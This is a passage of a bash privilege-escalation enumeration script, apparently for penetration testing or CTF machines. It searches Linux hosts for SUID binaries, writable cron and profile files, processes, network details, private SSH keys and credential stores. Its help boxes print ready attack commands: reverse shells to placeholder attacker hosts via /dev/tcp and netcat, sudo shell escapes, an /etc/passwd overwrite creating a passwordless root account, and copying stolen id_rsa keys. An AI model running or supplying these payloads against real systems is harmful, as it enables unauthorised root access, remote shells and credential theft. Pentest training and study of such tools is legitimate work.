            echo -e "\t  /usr/bin/vmware-user-suid-wrapper"
            echo -e "\t  /usr/lib/dbus-1.0/dbus-daemon-launch-helper"
    #------------------> Finding System SUID:
    echo -e "\n\033[0;37;44m[+] Finding System SUID:\033[0m"
    sys_suid= find / -perm -u=s 2>/dev/null | xargs ls -la --color=always
    echo -e "$sys_suid"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Compare the output with the built-in  binaries & Goolge them for any exploit. ║"
        echo -e "\t  ║Visite:                                                                       ║"
        echo -e "\t  ║https://gtfobins.github.io/                                                   ║"
        echo -e "\t  ║https://mil0.io/linux-privesc/                                                ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;44m[+] SUID not built-in:\033[0m"
    not_sys= find / -perm -u=s 2>/dev/null | xargs ls -la --color=always | grep -v pppd | grep -v exim4 | grep -v ntfs-3g | grep -v chsh | grep -v su | grep -v chfn | grep -v mount | grep -v sudo | grep -v umount | grep -v pkexec | grep -v passwd | grep -v newgrp | grep -v gpasswd | grep -v fusermount | grep -v mount.nfs | grep -v mount.cifs | grep -v Xorg.wrap | grep -v ssh-keysign | grep -v chrome-sandbox | grep -v polkit-agent-helper-1 | grep -v vmware-user-suid-wrapper | grep -v dbus-daemon-launch-helper
    echo -e "$not_sys"
    #------------------> Finding System GUID:
    echo -e "\n\033[0;37;44m[+] Finding System GUID:\033[0m"
    sys_guid= find / -perm -g=s -type f 2>/dev/null | xargs ls -la --color=always
    echo -e "$sys_guid"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Visite:                                                                       ║"
        echo -e "\t  ║https://gtfobins.github.io/                                                   ║"
        echo -e "\t  ║https://mil0.io/linux-privesc/                                                ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Execute as the owner:
    echo -e "\n\033[0;37;44m[+] Find Binaries that will execute as the owner:\033[0m"
    ex_owner= find / -perm -u=s -type f 2>/dev/null | xargs ls -la --color=always
    echo -e "$ex_owner"
    #------------------> Execute as the group:
    echo -e "\n\033[0;37;44m[+] Find binaries that will execute as the group:\033[0m"
    ex_group= find / -perm -g=s -type f 2>/dev/null | xargs ls -la --color=always
    echo -e "$ex_group"
    #------------------> Sticky-bit binaries:
    echo -e "\n\033[0;37;44m[+] Find sticky-bit binaries:\033[0m"
    st_bit= find / -type d -perm -1000 -exec ls -ld --color=always {} \; 2>/dev/null
    echo -e "$st_bit"
    #------------------> World writable scripts invoked as root:
    echo -e "\n\033[0;37;44m[+] World writable scripts invoked as root:\033[0m"
    echo -e "\n\033[0;37;41mRun this command manually: find / -writable -type f 2>/dev/null | xargs ls -la\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If you find a script that is owned by root but is writable by anyone, you can ║"
        echo -e "\t  ║add your own malicious code into it and it will escalate your privileges when ║"
        echo -e "\t  ║the script runs as root                                                       ║"
        echo -e "\t  ║\033[31mExploite:\033[0m                                                                     ║"
        echo -e "\t  ║\033[31mbash: echo 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' > file\033[0m    ║"
        echo -e "\t  ║\033[31mnetcat: echo 'nc <attacker_IP> <attacker_PORT> -e /bin/sh' > file\033[0m             ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> World writable directories:
    echo -e "\n\033[0;37;44m[+] World writable directories:\033[0m"
    wr_dir= find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; 2>/dev/null
    echo -e "$wr_dir"
    #------------------> writable config files:
    echo -e "\n\033[0;37;44m[+] writable config files:\033[0m"
    wr_conf= find /etc/ -writable -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null
    echo -e "$wr_conf"
    #------------------> How Files Can Be Upload/Download:
    echo -e "\n\033[0;37;44m[+] How Files Can Be Upload/Download:\033[0m"
    which_file= which wget nc netcat socat python python2 python3 ftp tftp ssh smb
    echo -e "$which_file"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Some of them my have file misconfiguration and my lead to user escalation.    ║"
        echo -e "\t  ║File Transfer Cheatsheet: Windows and Linux                                   ║"
        echo -e "\t  ║https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/    ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Unexpected commands:
     echo -e "\n\033[0;37;44m[+] Unexpected commands allows you to read and/or write files or even execute command:\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e '\t  ║sudo awk "BEGIN {system("/bin/sh")}"                                          ║'
        echo -e "\t  ║sudo find /etc -exec sh -i \;                                                 ║"
        echo -e "\t  ║sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh                          ║"
        echo -e "\t  ║sudo tar c a.tar -I ./runme.sh a                                              ║"
        echo -e "\t  ║ftp>!/bin/sh                                                                  ║"
        echo -e "\t  ║less>! <shell_comand>                                                         ║"
        echo -e "\t  ║                                Give it a try                                 ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Profiles files:
        echo -e "\n\033[0;37;44m[+] Profiles files:\033[0m"
    profile= ls -l /etc/profile /etc/profile.d/ --color=always
    echo -e "$profile"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║The file /etc/profile and the files under /etc/profile.d/ are scripts that are║"
        echo -e "\t  ║executed when a user run a new shell. Therefore, if you can write or modify   ║"
        echo -e "\t  ║any of the files, you can escalate your privilege.                            ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Is the .bashrc file writable?:
        echo -e "\n\033[0;37;44m[+] Is the .bashrc file writable?\033[0m"
    profile= ls -la /home/*/.bashrc; locate .bashrc | xargs ls -la --color=always; find / -name .bashrc -xdev 2>/dev/null | xargs ls -la --color=always
    echo -e "$profile"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If so, malicious commands can be written to it and will be executed when the  ║"
        echo -e "\t  ║user/root logs in.                                                            ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Enumeration:
    echo -e "\n\n\033[31m\t\t\tEnumeration on progress #############################################..................................... 50%\033[0m\n\n"
    sleep 5
#------------------> System Process:
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\033[31m [+]------------------------------------------------------------ [ System Process ] ------------------------------------------------------------[+]\033[0m"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n"
    sleep 1
    #------------------> Note:
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Have a look to what processes are being executed and check if any process has ║"
        echo -e "\t  ║more privileges than it should. You can also use a tool called psyp.          ║"
        echo -e "\t  ║https://github.com/DominicBreuker/pspy                                        ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Running Proccess:
    echo -e "\n\033[0;37;44m[+] Running Proccess on the system:\033[0m"
    proc= ps aux 
    echo -e "$proc"
    #------------------> Running Proccess as root
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Consider running the command by: ps aux | grep --color=always USERNAME        ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;44m[+] Running Proccess as root:\033[0m"
    proc_root= ps aux | grep --color=always root 
    echo -e "$proc_root"
    #------------------> Process binaries and associated permissions
    echo -e "\n\033[0;37;44m[+] Process binaries and associated permissions:\033[0m"
    proc_bin= ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null 
    echo -e "$proc_bin"
#------------------> System Path Scheduled Tasks:
    echo -e "\n"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\033[31m [+]------------------------------------------------------ [ System Path Scheduled Tasks ] -----------------------------------------------------[+]\033[0m"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n"
    sleep 1
    #------------------> Current User Crontab:
    echo -e "\n\033[0;37;44m[+] Current User Crontab:\033[0m"
    usr_cron= crontab -l 
    echo -e "$usr_cron"
    #------------------> Find World-Writable Cron jobs:
    echo -e "\n\033[0;37;44m[+] Find World-Writable Cron jobs:\033[0m"
    wr_cron= find /etc/cron* -type f -perm -o+w -exec ls -l {} \; 
    echo -e "$wr_cron"
    #------------------> Other User Crontab:
    echo -e "\n\033[0;37;44m[+] Other User Crontab [It may need root]:\033[0m"
    other_usr_cron= cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null 
    echo -e "$other_usr_cron"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If you have the root/user password, try to run the command manually:          ║"
        echo -e "\t  ║cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null             ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Scheduled Jobs:
    echo -e "\n\033[0;37;44m[+] Scheduled Jobs:\033[0m"
    sch_job= cat /etc/crontab 2>/dev/null 
    echo -e "$sch_job"
        echo -e "\n\033[0;37;41mIf the File is Writable\033[0m"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If the file is running by root, & writable to anyone, the attacker my replace the content of the file.    ║"
        echo -e "\t  ║\033[31mExploite:\033[0m                                                                                                 ║"
        echo -e "\t  ║\033[31mecho '/bin/sh' > file\033[0m                                                                                     ║"
        echo -e "\t  ║\033[31mecho '/bin/bash' > file \033[0m                                                                                  ║"
        echo -e "\t  ║\033[31mecho 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 443 >/tmp/f' > file\033[0m                    ║"
        echo -e "\t  ║\033[31mecho 'cp /bin/bash /tmp/bash; chmod 777 /tmp/bash' > file\033[0m                                                 ║"
        echo -e "\t  ║\033[31mecho 'echo root::0:0:root:/root:/bin/bash > /etc/passwd' > file\033[0m                                           ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
#------------------> Communications & Networking:
    echo -e "\n"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\033[31m [+]------------------------------------------------------ [ Communications & Networking ] -----------------------------------------------------[+]\033[0m"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n"
    sleep 1
    #------------------> Basic Network Details:
    echo -e "\n\033[0;37;44m[+] Basic Network Details:\033[0m"
    Basic= ip addr | sed -r ':a;N;$!ba;s/\n\s/ /g' | sed -r -n -e 's/^([0-9]+):\s(\w+).*(link\/(\w+))\s[a-f0-9:.]{,17}\sbrd\s[a-f0-9:.]{,17}\s*(inet\s([0-9]{1,3}(\.[0-9]{1,3}){3})).*/ \2 \6 \4/p' -e 's/^([0-9]+):\s(\w+).*(link\/(\w+))\s[a-f0-9:.]{,17}\sbrd\s[a-f0-9:.]{,17}.*/Gateway \2 0.0.0.0 \4/p' 
    echo -e "$Basic"
    #------------------> Full Network Details:
    echo -e "\n\033[0;37;44m[+] Full Network Details:\033[0m"
    n_details= /sbin/ifconfig 
    echo -e "$n_details"
    #------------------> Firewall Rulls:
    echo -e "\n\033[0;37;44m[+] Firewall Rulls:\033[0m"
    FW_details= iptables -nvL 
    echo -e "$FW_details"
    #------------------> Open Ports:
    echo -e "\n\033[0;37;44m[+]  Open Ports:\033[0m"
    open_port= netstat -tulpna 
    echo -e "$open_port"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Are there any open ports on localhost we did not see when we were doing nmap? ║"
        echo -e "\t  ║This might need tunneling or connecting to it locally. If nothing is displayed║"
        echo -e "\t  ║run the command manually: netstat -tulpna                                     ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Network Route & Neighbours:
    echo -e "\n\033[0;37;44m[+] Network Route & Neighbours:\033[0m"
    n_route= route; ip n
    echo -e "$n_route"
    #------------------> ARP Cashe:
    echo -e "\n\033[0;37;44m[+] ARP Cashe:\033[0m"
    arp= arp 
    echo -e "$arp"
    #------------------> Pivoting:
    echo -e "\n\033[0;37;44m[+] Pivoting:\033[0m"
        echo -e "\t  ╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Try to scan the Host network and see if there is any other host are online, use any of:                             ║"
        echo -e '\t  ║for ip in $(seq 1 255); do ping -c 1 v.v.v.$ip | grep "bytes from"; done                                            ║'
        echo -e "\t  ║for i in {1..255}; do ping -c 1 v.v.v.$i | grep 'bytes from' ; done                                                 ║"
        echo -e '\t  ║for i in {1..255} ;do (ping v.v.v.$i -c 1 -w 5  >/dev/null && echo "v.v.v.$i Host Is Alive") ; done                 ║'
        echo -e "\t  ║We won't be able to access those machine, therefor, will have to do tunneling from the current machine to them.     ║"
        echo -e "\t  ║Read More:                                                                                                          ║"
        echo -e "\t  ║https://nullsweep.com/pivot-cheatsheet-for-pentesters/                                                              ║"
        echo -e "\t  ║https://0xdf.gitlab.io/2019/01/28/pwk-notes-tunneling-update1.html                                                  ║"
        echo -e "\t  ║https://ivanitlearning.wordpress.com/2019/03/08/client-side-exploitation-windows-pivoting-w-o-metasploit/           ║"
        echo -e "\t  ╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Hosts File:
    echo -e "\n\033[0;37;44m[+] Hosts File:\033[0m"
    host_file= cat /etc/hosts 
    echo -e "$host_file"
    #------------------> Name Server:
    echo -e "\n\033[0;37;44m[+] Name Server:\033[0m"
    name_server= cat /etc/resolv.conf 
    echo -e "$name_server"
    #------------------> Enumeration:
    echo -e "\n\n\033[31m\t\t\tEnumeration on progress ################################################################.................. 80%\033[0m\n\n"
    sleep 5
#------------------> Finding SSH Keys:
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\033[31m [+]------------------------------------------------------------ [ Finding SSH Keys ] ----------------------------------------------------------[+]\033[0m"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n"
    sleep 1
    #------------------> Identify any existing public or private keys:
    echo -e "\n\033[0;37;44m[+] Identify any existing public or private keys:\033[0m"
    ssh_key= ls -la /root /etc/ssh /home/*/.ssh/ --color=always 2>/dev/null; cat /home/*/.ssh/id_rsa 2>/dev/null; cat /home/*/.ssh/id_dsa 2>/dev/null
    echo -e "$ssh_key"
    echo -e "\n\033[0;37;41mExploiting Misconfigured SSH Keys\033[0m"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Secure Shell (SSH) is a cryptographic network protocol which allows users to securely      ║"
        echo -e "\t  ║perform a number of network services, such as remote authentication or file transfer over  ║"
        echo -e "\t  ║an unsecured network. Exploite:                                                            ║"
        echo -e "\t  ║https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/ ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> id_rsa:
    echo -e "\n\033[0;37;44m[+] id_rsa:\033[0m"
    rsa= find / -name id_rsa 2> /dev/null 
    echo -e "$rsa"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║If anyone have access to any user's id_rsa, he can login to the system using that key.     ║"
        echo -e "\t  ║\033[31mExploite:\033[0m                                                                                  ║"
        echo -e "\t  ║\033[31mscp -P 22 username@v.v.v.v:/path/of/victim /path/to/attacker\033[0m                               ║"
        echo -e "\t  ║\033[31mchmod 0600 id_rsa\033[0m                                                                          ║"
        echo -e "\t  ║\033[31mssh -p 22 user-of-id_rsa@v.v.v.v -i id_rsa\033[0m                                                 ║"
        echo -e "\t  ║Read More:                                                                                 ║"
        echo -e "\t  ║https://matt.might.net/articles/ssh-hacks/                                                 ║"
        echo -e "\t  ║https://book.hacktricks.xyz/pentesting/pentesting-ssh                                      ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════╝"
    #------------------> id_dsa:
    echo -e "\n\033[0;37;44m[+] id_dsa:\033[0m"
    dsa= find / -name id_dsa 2> /dev/null 
    echo -e "$dsa"
    #------------------> locate authorized_keys:
    echo -e "\n\033[0;37;44m[+] authorized_keys:\033[0m"
    authorized_keys= find / -name authorized_keys 2> /dev/null 
    echo -e "$authorized_keys"
    #------------------> ssh_config File:
    echo -e "\n\033[0;37;44m[+] ssh_config File:\033[0m"
    ssh_config= ls -la /etc/ssh/ssh_config | grep config --color=always
    ssh_config2= ls -la /usr/share/openssh/sshd_config | grep config --color=always
    echo -e "$ssh_config"
    echo -e "$ssh_config2"
    echo -e "\n\033[0;37;44m[+] Reading ssh_config File:\033[0m"
    cat_ssh_config= cat /etc/ssh/ssh_config 
    cat_ssh_config2= /usr/share/openssh/sshd_config 
    echo -e "$cat_ssh_config"
    echo -e "$cat_ssh_config2"
    #------------------> hosts.denied:
    echo -e "\n\033[0;37;44m[+] hosts.denied:\033[0m"
    host_denied= ls -la /etc/hosts.denied 2> /dev/null 
    echo -e "$host_denied"
    echo -e "\n\033[0;37;44m[+] Reading hosts.denied:\033[0m"
    cat_hosts_denied= cat /etc/hosts.denied 2> /dev/null 
    echo -e "$cat_hosts_denied"
    #------------------> hosts.allow:
    echo -e "\n\033[0;37;44m[+] hosts.allow:\033[0m"
    host_allow= ls -la /etc/hosts.allow 2> /dev/null 
    echo -e "$host_allow"
    echo -e "\n\033[0;37;44m[+] Reading hosts.allow:\033[0m"
    cat_host_allow= cat /etc/hosts.allow 2> /dev/null 
    echo -e "$cat_host_allow"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║When a client attempts to connect to a network service on a remote system, these files are     ║"
        echo -e "\t  ║used to determine whether client access is allowed or denied. Use /etc/hosts.allow and         ║"
        echo -e "\t  ║/etc/hosts.deny to define rules that selectively allow or deny clients access to server        ║"
        echo -e "\t  ║daemons on local system.                                                                       ║"
        echo -e "\t  ║Read More:                                                                                     ║"
        echo -e "\t  ║https://www.thegeekdiary.com/understanding-tcp-wrappers-in-linux/                              ║"
        echo -e "\t  ║http://www.freekb.net/Article?id=1091                                                          ║"
        echo -e "\t  ║https://www.smartdomotik.com/2015/02/09/using-etchosts-allow-and-etchosts-deny-to-secure-unix/ ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════════════════════╝"
#------------------> Extra Creds:
    echo -e "\n"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\033[31m [+]-------------------------------------------------------------- [ Extra Creds ] -------------------------------------------------------------[+]\033[0m"
    echo -e "\033[31m [+]############################################################################################################################################[+]\033[0m"
    echo -e "\n"
    sleep 1
    #------------------> Look Manually:
    echo -e "\n\033[0;37;44m[+] Mail File:\033[0m"
    mail_file= ls -la /var/mail/ --color=always 2>/dev/null
    echo -e "$mail_file"
    echo -e "\n\033[0;37;44m[+] Root Directory:\033[0m"
    root_dir= ls -la /root/ 2>/dev/null --color=always
    echo -e "$root_dir"
    echo -e "\n\033[0;37;44m[+] Home Directory:\033[0m"
    home_dir= ls -la /home/ --color=always 2>/dev/null
    echo -e "$home_dir"
    echo -e "\n\033[0;37;44m[+] Tmp Directory:\033[0m"
    tmp_dir= ls -la /tmp  --color=always 2>/dev/null
    echo -e "$tmp_dir"
    echo -e "\n\033[0;37;44m[+] Backup Directory:\033[0m"
    backup_dir= ls -la /var/backups 2>/dev/null && find / -type f  -name *backup* -o -name *.bak -o -name *.bak* -o -name *.bck -o -name *.bk -o -name *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup
    echo -e "$backup_dir"
    echo -e "\n\033[0;37;44m[+] Apache2 Version:\033[0m"
    apa_de= apache2 -v 2>/dev/null; httpd -v 2>/dev/null
    echo -e "$apa_de"
    echo -e "\n\033[0;37;44m[+] Apache user:\033[0m"
    apa_user= grep --color=always -i 'user\|group' /etc/apache2/envvars 2>/dev/null --color=always
    echo -e "$apa_user"
    echo -e "\n\033[0;37;44m[+] Apache Config File:\033[0m"
    apa_conf= cat /var/apache2/config.inc 2>/dev/null --color=always
    echo -e "$apa_conf"
    echo -e "\n\033[0;37;44m[+] Check readability of apache/nginx access log:\033[0m"
    apa_accf= cat /var/log/apache/access.log 2>/dev/null --color=always
    echo -e "$apa_acc"
    apa2_acc= cat /var/log/apache2/access.log 2>/dev/null --color=always
    echo -e "$apa2_acc"
    nginx= cat /var/log/nginx/access.log 2>/dev/null --color=always
    echo -e "$nginx"
    echo -e "\n\033[0;37;44m[+] MySQL Version:\033[0m"
    mysql_ver= mysql --version 2>/dev/null --color=always
    echo -e "$mysql_ver"
    echo -e "\n\033[0;37;44m[+] MySQL:\033[0m"
    mysql= ls -la /var/lib/mysql 2>/dev/null --color=always
    echo -e "$mysql"
    echo -e "\n\033[0;37;44m[+] Log File:\033[0m"
    log_file= ls -la /var/log 2>/dev/null --color=always
    echo -e "$log_file"
    echo -e "\n\033[0;37;44m[+] Spool File:\033[0m"
    spool_file= ls -la /var/spool 2>/dev/null --color=always
    echo -e "$spool_file"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Contains data which is awaiting some kind of later processing. Data in /var/spool ║"
        echo -e "\t  ║represents work to be done in the future (by a program, user, or administrator);  ║"
        echo -e "\t  ║often data is deleted after it has been processed.                                ║"
        echo -e "\t  ║Read More:                                                                        ║"
        echo -e "\t  ║https://refspecs.linuxfoundation.org/FHS_3.0/fhs/ch05s14.html                     ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;44m[+] PostgreSQL Version:\033[0m"
    pgsql_ver= postgres --version 2>/dev/null 
    echo -e "$pgsql_ver"
    echo -e "\n\033[0;37;44m[+] PostgreSQL:\033[0m"
    pgsql= ls -la /var/lib/pgsql 2>/dev/null 
    echo -e "$pgsql"
    echo -e "\n\033[0;37;44m[+] System files dont belong to root:\033[0m"
    sys_file_no_root= find /lib/systemd/ \! -uid 0 -type f 2>/dev/null | xargs -r ls -la 2>/dev/null --color=always
    echo -e "$sys_file_no_root"
    echo -e "\n\033[0;37;44m[+] Tools/Languages Installed:\033[0m"
    tool_lang= which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null 
    echo -e "$tool_lang"
        echo -e "\t  ╔══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Some of the tools have an exploit, do compgen -c to list all of the tools.    ║"
        echo -e "\t  ║Exploit: https://gtfobins.github.io/                                          ║"
        echo -e "\t  ╚══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;44m[+] Read roots mail:\033[0m"
    root_mail= head /var/mail/root 2>/dev/null 
    echo -e "$root_mail"
    echo -e "\n\033[0;37;44m[+] Config Files:\033[0m"
    Config_Files= find / -name *.config -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
    echo -e "$Config_Files"
    echo -e "\n\033[0;37;44m[+] Bash Files:\033[0m"
    sh_files= find / -name *.sh -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
    echo -e "$sh_files"
    echo -e "\n\033[0;37;44m[+] .GPG Files:\033[0m"
    gpg_files= find / -name *.gpg -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
    echo -e "$gpg_files"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║A GPG file is a security key used to decrypt an encrypted file generated by GNU║"
        echo -e "\t  ║Privacy Guard (GnuPG), a file encryption program. The secure format is based on║"
        echo -e "\t  ║the OpenPGP standard defined by RFC2440,the same standard Pretty Good Privacy  ║"
        echo -e "\t  ║(.PGP) files use.                                                              ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;44m[+] Python Files:\033[0m"
    py_files= find / -name *.py -type f 2>/dev/null | xargs ls -la 2>/dev/null --color=always
    echo -e "$py_files"
    echo -e "\n\033[0;37;44m[+] KeePass database file:\033[0m"
    echo -e "[*] .kdbx files:"
    kdbx= find / -name *.kdbx -type f 2>/dev/null --color=always
    echo -e "[*] .kdb files:"
    kdb= find / -name *.kdb -type f 2>/dev/null --color=always 
    echo -e "$kdbx"
    echo -e "$kdb"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║KeePass is a free open source password manager, which helps you to manage your ║"
        echo -e "\t  ║passwords in a secure way. You can store all your passwords in one database,   ║"
        echo -e "\t  ║which is locked with a master key. There are many exploits on the internet.    ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
    echo -e "\n\033[0;37;44m[+] Print IPSEC VPN Keys (requires root):\033[0m"
    vpn_key= ip xfrm state list 
    echo -e "$vpn_key"
    echo -e "\n\033[0;37;44m[+] OpenLDAP Configuration:\033[0m"
    ldap= cat /etc/openldap/ldap.conf 2>/dev/null 
    echo -e "$ldap"
    echo -e "\n\033[0;37;44m[+] Current user trash files:\033[0m"
    trash_files= ls -la ~/.local/share/Trash/ 
    echo -e "$trash_files"
        echo -e "\t  ╔═══════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t  ║Have a look at the trash files and see if you can find any useful information. ║"
        echo -e "\t  ╚═══════════════════════════════════════════════════════════════════════════════╝"
    #------------------> Enumeration Completed:
    echo -e "\n\n\033[31m\t\t\tEnumeration is completed ################################################################################## 100%\033[0m\n\n"
